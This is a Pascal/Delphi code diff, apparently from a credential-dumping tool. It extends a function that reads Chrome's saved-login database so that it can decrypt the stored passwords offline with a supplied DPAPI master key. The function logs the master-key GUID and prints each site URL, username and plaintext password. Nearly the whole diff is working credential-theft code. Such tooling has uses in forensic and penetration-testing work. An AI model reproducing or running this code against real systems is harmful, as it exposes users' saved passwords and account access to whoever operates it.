@@ -13,9 +13,10 @@ uses
   {$ifndef static}SynSQLite3,{$endif}
   syndb,syndbsqlite3,
   shlobj,
-  ucryptoapi,utils;
+  ucryptoapi,utils,
+  udpapi;
 
-function decrypt_chrome(db:string=''):boolean;
+function decrypt_chrome(db:string='';mk:pointer=nil):boolean;
 function decrypt_cookies(db:string=''):boolean;
 
 implementation
@@ -36,7 +37,7 @@ begin
     end;
 end;
 
-function decrypt_chrome(db:string=''):boolean;
+function decrypt_chrome(db:string='';mk:pointer=nil):boolean;
 var
 Props: TSQLDBSQLite3ConnectionProperties ;
   //
@@ -46,6 +47,11 @@ Props: TSQLDBSQLite3ConnectionProperties ;
   path,tmp:string;
   //li:TListItem ;
   Rows: ISQLDBRows;
+  //
+  blob:tdpapi_blob;
+  guidMasterKey:string='';
+  ptr_:pointer;
+  dw:dword;
 begin
   result:=false;
 //C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default
@@ -93,6 +99,24 @@ if (db<>'') and (fileexists(db)=false) then begin writeln('db does not exist');e
       tmp:=''; //for i:=0 to length(b)-1 do b[i]:=0;
       b:=rows.ColumnBlobBytes('password_value');
       //CryptUnprotect(b,tmp);
+      if guidMasterKey='' then
+         begin
+         guidMasterKey:=' ';
+         if decodeblob (b,@blob) then guidMasterKey:=GUIDToString (blob.guidMasterKey) ;
+         //log('dwDataLen:'+inttostr(blob.dwDataLen));
+         //log('dwFlags:'+inttostr(blob.dwFlags ),1);
+         log('guidMasterKey:'+guidMasterKey,1);
+         end;
+      if mk<>nil then //if a decrypted MK is provided...
+         begin
+         if dpapi_unprotect_blob(@blob,mk ,20,nil,0,nil,ptr_,dw) then
+            begin
+            //20=sha1_length
+            if length(output)<255
+              then writeln(rows['origin_url']+';'+rows['username_value']+';'+AnsiString(ptr_^));
+            end else writeln(rows['origin_url']+';'+rows['username_value']+';'+'SCRAMBLED');
+      end   ////if mk<>nil then
+      else  //if mk<>nil then
       if CryptUnProtectData_(b,output)=true then
          begin
          if length(output)<255 then
